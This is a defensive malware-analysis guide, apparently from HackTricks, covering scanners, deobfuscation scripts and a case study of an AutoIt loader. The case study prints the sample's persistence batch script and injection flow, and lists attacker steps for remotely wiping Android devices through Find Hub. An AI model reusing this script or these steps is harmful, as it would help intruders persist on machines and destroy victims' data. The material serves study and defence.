# Malware Analysis

{{#include ../../banners/hacktricks-training.md}}

## Forensics CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## 온라인 서비스

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## 오프라인 안티바이러스 및 탐지 도구

### Yara

#### 설치
```bash
sudo apt-get install -y yara
```
#### 규칙 준비

이 스크립트를 사용해 github에서 모든 yara malware rules를 다운로드하고 병합하세요: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
_**rules**_ 디렉토리를 생성하고 스크립트를 실행하세요. 그러면 모든 yara rules를 포함하는 _**malware_rules.yar**_ 파일이 생성됩니다.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### 스캔
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: 맬웨어 검사 및 규칙 생성

도구 [**YaraGen**](https://github.com/Neo23x0/yarGen)을 사용하여 바이너리에서 yara rules를 생성할 수 있습니다. 다음 튜토리얼을 확인하세요: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### 설치
```
sudo apt-get install -y clamav
```
#### 스캔
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa**는 실행 파일: PE, ELF, .NET에서 잠재적으로 악성인 **capabilities**를 탐지한다. 그래서 Att\&ck tactics 같은 것들이나 다음과 같은 의심스러운 capabilities를 찾아낸다:

- check for OutputDebugString error
- run as a service
- create process

다음 [**Github repo**](https://github.com/mandiant/capa)에서 얻을 수 있다.

### IOCs

IOC는 Indicator Of Compromise의 약자다. IOC는 잠재적으로 원치 않는 소프트웨어나 확인된 **malware**를 식별하는 **conditions that identify**의 집합이다. Blue Teams는 이러한 정의를 사용해 자신의 **systems**와 **networks**에서 이러한 유형의 악성 파일을 **search for this kind of malicious files**.\  
이러한 정의를 공유하는 것은 매우 유용하다. 컴퓨터에서 malware가 식별되어 해당 malware에 대한 IOC가 만들어지면, 다른 Blue Teams는 이를 사용해 malware를 더 빠르게 식별할 수 있다.

IOC를 생성하거나 수정하는 도구로는 [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)가 있다. [**Redline**](https://www.fireeye.com/services/freeware/redline.html) 같은 도구를 사용해 디바이스에서 정의된 IOCs를 검색할 수 있다.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) 는 Simple Indicators of Compromise용 스캐너다.\  
탐지는 네 가지 detection methods에 기반한다:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) 은 GNU GPLv2 license 하에 배포되는 Linux용 malware scanner로, 공유 호스팅 환경에서 직면하는 위협을 중심으로 설계되었습니다. 네트워크 엣지 침입 탐지 시스템에서 수집된 위협 데이터를 사용해 공격에 실제로 사용되는 malware를 추출하고 탐지를 위한 시그니처를 생성합니다. 또한 위협 데이터는 LMD의 checkout 기능을 통한 사용자 제출과 malware 커뮤니티 리소스에서도 파생됩니다.

### rkhunter

도구들, 예를 들어 [**rkhunter**](http://rkhunter.sourceforge.net) 는 파일 시스템을 검사하여 가능한 **rootkits** 및 malware를 확인하는 데 사용될 수 있습니다.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) 는 다양한 기법을 사용해 executables 내부의 obfuscated 문자열을 찾아내려고 시도하는 도구입니다.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) 는 executable 내부의 기본적인 항목들(binary data, entropy, URLs and IPs, some yara rules)을 검사합니다.

### PEstudio

[PEstudio](https://www.winitor.com/download) 는 imports, exports, headers 같은 Windows executables의 정보를 얻을 수 있게 해주며, 또한 virus total을 확인하고 잠재적인 Att\&ck techniques를 찾아냅니다.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) 는 파일이 **encrypted**인지 감지하고 또한 **packers**를 찾아내는 도구입니다.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) 는 text/script 파일 내의 **obfuscated** 및 **encrypted** 콘텐츠를 감지하기 위해 다양한 **statistical methods**를 사용하는 Python 스크립트입니다. NeoPI의 목적은 **detection of hidden web shell code**를 돕는 것입니다.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) 는 **obfuscated**/**dodgy code**를 탐지하고, 종종 **malwares**/webshells에서 사용되는 **PHP** 함수들을 사용하는 파일들도 찾아냅니다.

### Apple Binary Signatures

어떤 **malware sample**을 확인할 때는 서명한 **developer**가 이미 **related**되어 있을 수 있으므로 바이너리의 **check the signature**를 항상 해야 합니다.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## 탐지 기법

### File Stacking

어떤 폴더가 웹 서버의 **files**를 포함하고 있고 **last updated on some date**인 것을 알고 있다면, **web server**의 모든 **files**가 생성 및 수정된 **date**를 **check**하고 어떤 **date**가 **suspicious**하면 해당 파일을 검사하세요.

### Baselines

폴더의 **files**가 **shouldn't have been modified** 상태여야 한다면, 그 폴더의 **original files**의 **hash**를 계산해 **current** 파일들과 **compare**하세요. 변경된 항목은 **suspicious**합니다.

### Statistical Analysis

정보가 **logs**에 저장되어 있다면, 각 **web server**의 파일이 몇 번 접근되었는지 같은 통계를 **check**할 수 있습니다. 예를 들어 **web shell**은 가장 많이 접근된 항목 중 하나일 수 있습니다.

---

### Android in-app native telemetry (no root)

Android에서는 다른 JNI 라이브러리들이 초기화되기 전에 작은 로거 라이브러리를 preload하여 대상 앱 프로세스 내부의 native 코드를 계측할 수 있습니다. 이렇게 하면 시스템 전체 훅이나 root 없이도 native 동작을 조기 가시화할 수 있습니다. 인기 있는 방법은 SoTap: 올바른 ABI용 libsotap.so를 APK에 넣고 초기에 System.loadLibrary("sotap") 호출(예: static initializer 또는 Application.onCreate)에 삽입한 다음, 내부/외부 경로에서 로그를 수집하거나 Logcat을 폴백으로 사용합니다.

설정 세부사항과 로그 경로는 Android native reversing 페이지를 참조하세요:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI 네이티브 문자열 난독화 해제 with angr + Ghidra

일부 Android 악성코드 및 RASP로 보호된 앱은 RegisterNatives를 호출하기 전에 런타임에 JNI 메서드 이름과 시그니처를 디코딩하여 숨깁니다. Frida/ptrace 계측이 anti-debug에 의해 차단될 때에도, in-binary 디코더를 angr로 실행하여 오프라인에서 평문을 복구한 후 결과를 Ghidra에 코멘트로 밀어넣을 수 있습니다.

핵심 아이디어: .so 내부의 디코더를 호출 가능한 함수로 취급하고, .rodata에 있는 난독화된 바이트 블롭에 대해 이를 실행한 뒤 첫 번째 \x00(C-string terminator)까지 출력 바이트를 구체화(concretize)합니다. 주소 불일치를 피하려면 angr와 Ghidra에서 같은 image base를 사용하세요.

워크플로우 개요
- Ghidra로 트리아지: JNI_OnLoad 및 RegisterNatives 설정에서 디코더와 그 호출 규약/인자를 식별합니다.
- angr(CPython3) 실행: 대상 문자열마다 디코더를 실행하고 결과를 덤프합니다.
- Ghidra에 주석 추가: 각 호출 지점에 디코딩된 문자열을 자동 코멘트로 달아 빠른 JNI 재구성을 지원합니다.

Ghidra 트리아지 (JNI_OnLoad 패턴)
- JNI_OnLoad에 JNI datatypes를 적용해 Ghidra가 JNINativeMethod 구조체를 인식하도록 합니다.
- Oracle 문서 기준의 전형적인 JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives 호출을 찾으세요. 라이브러리가 로컬 루틴(예: FUN_00100e10)으로 name/signature를 구성하고 정적 바이트 테이블(예: DAT_00100bf4)을 참조하며 (encoded_ptr, out_buf, length) 같은 인자를 받는다면, 이는 오프라인 실행의 이상적인 대상입니다.

angr 설정 (오프라인에서 디코더 실행)
- .so를 Ghidra에서 사용한 동일한 base(예: 0x00100000)로 로드하고, 상태를 작게 유지하기 위해 외부 라이브러리의 자동 로드를 비활성화합니다.

<details>
<summary>angr 설정 및 오프라인 디코더 실행</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- 대규모로는 call sites와 decoder의 인자 (encoded_ptr, size)를 매핑한 정적 맵을 구축하라. Wrappers는 인자를 숨길 수 있으므로, API 복구가 불안정하면 Ghidra xrefs에서 이 매핑을 수동으로 생성할 수 있다.

<details>
<summary>angr로 여러 call sites를 일괄 디코드</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra에서 호출 지점에 주석 달기
옵션 A: Jython 전용 주석 작성기 (미리 생성한 JSON 사용)
- angr가 CPython3을 요구하므로 난독화 해제와 주석 작성을 분리하세요. 먼저 위의 angr 스크립트를 실행하여 decoded_strings.json을 생성합니다. 그런 다음 이 Jython GhidraScript를 실행하여 각 호출 지점에 PRE_COMMENTs를 작성합니다(문맥을 위해 호출자 함수 이름 포함):

<details>
<summary>Ghidra Jython 스크립트 — 디코딩된 JNI strings에 주석 달기</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

옵션 B: pyhidra/ghidra_bridge를 통한 단일 CPython 스크립트
- 또는 pyhidra나 ghidra_bridge를 사용해 angr와 동일한 CPython 프로세스에서 Ghidra의 API를 제어할 수 있다. 이렇게 하면 decode_string()을 호출하고 중간 파일 없이 바로 PRE_COMMENTs를 설정할 수 있다. 로직은 Jython 스크립트와 유사하다: ReferenceManager를 통해 callsite→function 맵을 구성하고, angr로 디코드한 뒤 주석을 설정한다.

왜 이 방법이 효과적이며 언제 사용해야 하는가
- 오프라인 실행은 RASP/anti-debug를 회피한다: 문자열 복구에 ptrace나 Frida 훅이 필요 없다.
- Ghidra와 angr의 base_addr를 일치시켜(예: 0x00100000) 함수/데이터 주소가 툴 간에 일치하도록 한다.
- 디코더에 대한 재현 가능한 방법: 변환을 순수 함수로 보고, 새로운 state에 출력 버퍼를 할당한 다음 (encoded_ptr, out_ptr, len)로 호출하고 state.solver.eval로 구체화한 뒤 \x00까지 C-strings를 파싱한다.

주의사항 및 함정
- 대상 ABI/호출 규약을 준수하라. angr.factory.callable은 arch에 따라 하나를 선택한다; 인수가 밀려 보이면 cc를 명시적으로 지정하라.
- 디코더가 0으로 초기화된 출력 버퍼를 요구하면 호출 전에 state에서 outbuf를 0으로 초기화하라.
- position-independent Android .so의 경우 angr의 주소가 Ghidra에서 보는 주소와 일치하도록 항상 base_addr를 제공하라.
- 앱이 디코더를 얇은 스텁으로 감싸더라도 currentProgram.getReferenceManager()를 사용해 call-xrefs를 열거하라.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

현대의 악성코드 계열은 Control-Flow Graph (CFG) 난독화를 심하게 악용한다: 직접적인 jump/call 대신 목적지를 런타임에 계산하고 `jmp rax` 또는 `call rax`를 실행한다. 작은 *dispatcher* (일반적으로 9개의 명령어)가 CPU의 `ZF`/`CF` 플래그에 따라 최종 타겟을 설정하여 정적 CFG 복구를 완전히 붕괴시킨다.

이 기법은 SLOW#TEMPEST loader에서 보여진 것처럼 IDAPython과 Unicorn CPU emulator만을 사용하는 세 단계 워크플로로 해제할 수 있다.

### 1. 모든 간접 jump / call 찾기
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. dispatcher byte-code 추출
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn으로 두 번 에뮬레이트하라
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
브랜치의 *거짓* 및 *참* 대상(타깃)을 얻기 위해 `run(code,0,0)` 및 `run(code,1,1)`을 실행하세요.

### 4. 직접 jump / call을 패치하여 복원하기
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
패치 후 IDA가 함수를 재분석하도록 강제하면 전체 CFG 및 Hex-Rays 출력이 복원됩니다:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. 간접 API 호출에 라벨 지정

모든 `call rax`의 실제 목적지를 파악하면 IDA에 그것이 무엇인지 알려 파라미터 타입과 변수 이름을 자동으로 복구할 수 있습니다:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### 실용적 이점

* 실제 CFG를 복원 → decompilation이 *10* 줄에서 수천 줄로 바뀝니다.
* string-cross-reference & xrefs를 활성화하여 동작 재구성이 쉬워집니다.
* 스크립트는 재사용 가능: 동일한 트릭으로 보호된 어떤 loader에도 넣으면 됩니다.

---

## AutoIt 기반 loaders: .a3x decryption, Task Scheduler masquerade 및 RAT injection

이 침투 패턴은 서명된 MSI, .a3x로 컴파일된 AutoIt loaders, 그리고 정상 앱으로 가장하는 Task Scheduler 작업을 연계합니다.

### MSI → custom actions → AutoIt orchestrator

MSI custom actions에 의해 실행되는 프로세스 트리 및 명령:

- MsiExec.exe → cmd.exe (install.bat 실행)
- WScript.exe (미끼 오류 대화 상자 표시)
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader를 배치하고, persistence를 설정하며, self-cleans를 수행):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (사용자 미끼):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- C:\Users\Public\Music에 `AutoIt3.exe` 및 `IoKlTr.au3`를 드롭함
- `schtasks.exe`를 `hwpviewer.exe`로 복사( Hangul Word Processor viewer로 위장)
- 1분마다 실행되는 예약 작업 "IoKlTr" 생성
- 시작 항목 LNK로는 `Smart_Web.lnk`가 보이며; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- `%APPDATA%\Google\Browser\` 하위 폴더(adb 또는 adv를 포함)에 모듈을 단계별로 배치하고 `autoit.vbs`/`install.bat` 헬퍼로 시작

Forensic triage tips:
- schtasks 열거: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML과 같은 위치에 있는 schtasks.exe의 이름이 변경된 복사본 검색: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- 일반 경로: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, 시작 항목 `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- 프로세스 생성 상관관계: AutoIt3.exe가 cleanmgr.exe, hncfinder.exe 같은 정상 Windows 바이너리를 실행하는지 확인

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt 모듈은 `#AutoIt3Wrapper_Outfile_type=a3x`로 컴파일되며 임베디드 payloads를 복호화한 뒤 정상 프로세스에 주입함.
- 관찰된 패밀리: QuasarRAT (`hncfinder.exe`에 주입됨), RftRAT/RFTServer (`cleanmgr.exe`에 주입됨), 및 RemcosRAT 모듈 (`Remcos\RunBinary.a3x`).
- 복호화 패턴: HMAC을 통해 AES 키를 파생시키고 임베디드 blob을 복호화한 뒤 평문 모듈을 주입함.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) of the target host (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory with decrypted module/shellcode
- CreateRemoteThread or QueueUserAPC to execute payload

Hunting ideas
- AutoIt3.exe parented by MsiExec.exe or WScript.exe spawning system utilities
- Files with `.a3x` extensions or AutoIt script runners under public/user-writable paths
- Suspicious scheduled tasks executing AutoIt3.exe or binaries not signed by Microsoft, with minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

During the Windows intrusion, operators used stolen Google credentials to repeatedly wipe the victim’s Android devices, suppressing notifications while they expanded access via the victim’s logged-in desktop messenger.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## Tracing heavily obfuscated Node.js loaders

Attackers increasingly bundle JavaScript loaders inside standalone Windows binaries compiled with [`nexe`](https://github.com/nexe/nexe), so the runtime ships together with the script. The resulting PE often weighs 60–90 MB and executes even if Node.js is not installed. During triage:

- Use [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) to carve the embedded JavaScript out of the PE and feed it to local tooling for static diffing.
- Expect a disk-based mutex in `%TEMP%` (GachiLoader drops a random `<name>.lock` file that expires after ~5 minutes). Copying the file to the sandbox before execution lets you skip redundant stages while still seeing later payloads.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hooks core modules inside any Node.js process, lets you spoof anti-VM probes, and preserves every artifact the sample writes. Launch obfuscated scripts through the tracer to keep analyst-controlled instrumentation in the call stack:
```powershell
node -r .\tracer.js main.js
```
Key configuration toggles inside `tracer.js` allow you to:

- 파일시스템, 자식 프로세스, 및 HTTP 활동을 로깅합니다 (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). `kidkadi.node`와 같은 모든 드롭된 파일은 악성코드가 삭제하기 전에 작업 디렉터리로 복사됩니다.
- 현실적인 RAM/CPU 수치 반환, `tasklist` 출력 위조, PowerShell/WMI 응답 변조를 통해 환경 지문을 오버라이드합니다. 이는 ≥4 GB RAM, ≥2 cores를 요구하고 사용자 이름(`mashinesssss`, `wdagutilityaccount`, 등), 호스트명(`desktop-vrsqlag`, `server1` …), 및 프로세스 이름(`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`)을 검사하는 로더를 우회합니다.
- `Get-WmiObject Win32_DiskDrive`(본인 확인을 위해 `vmware`, `kvm`, `virtio` 등을 찾음), `Win32_VideoController`(“VirtualBox Graphics Adapter”, “Hyper-V Video” 등 차단) 및 `Win32_PortConnector` 개수와 같은 WMI 하드웨어 검사를 무력화합니다. 이러한 탐침이 “실제” 하드웨어를 보고하면, sandboxes는 더 이상 GachiLoader가 분석 시간을 낭비하기 위해 사용하는 `Invoke-WebRequest`의 무해한 `linkedin.com`, `grok.com`, `whatsapp.com` 등과 같은 도메인에 대한 무한 루프에 빠지지 않습니다.

### Capturing gated C2 traffic automatically

tracer의 네트워크 훅은 JavaScript 난독화를 리버스하지 않고도 다중 레이어 C2 인증을 드러냅니다. 관찰된 캠페인에서 로더는:

1. 각 하드코딩된 C2에 `/log`로 호스트 텔레메트리를 POST합니다.
2. `X-Secret: gachifamily` 헤더와 함께 `GET /richfamily/<per-sample key>`를 요청하여 Base64-encoded 페이로드 URL을 가져옵니다.
3. 그 URL에 대해 긴 per-sample `X-Secret` 헤더를 포함한 최종 `GET`을 수행합니다; 헤더가 없으면 `403 Forbidden`을 반환합니다.

tracer가 완전한 요청(헤더, 바디, 목적지)을 기록하기 때문에, 동일한 트래픽을 재생해 페이로드를 가져오고, Themida/VMProtect 셸을 메모리에서 덤프하며, 대규모로 Rhadamanthys 구성 데이터를 추출할 수 있습니다.

## AdaptixC2: Configuration Extraction and TTPs

전용 페이지를 참조하세요:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## 참고자료

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
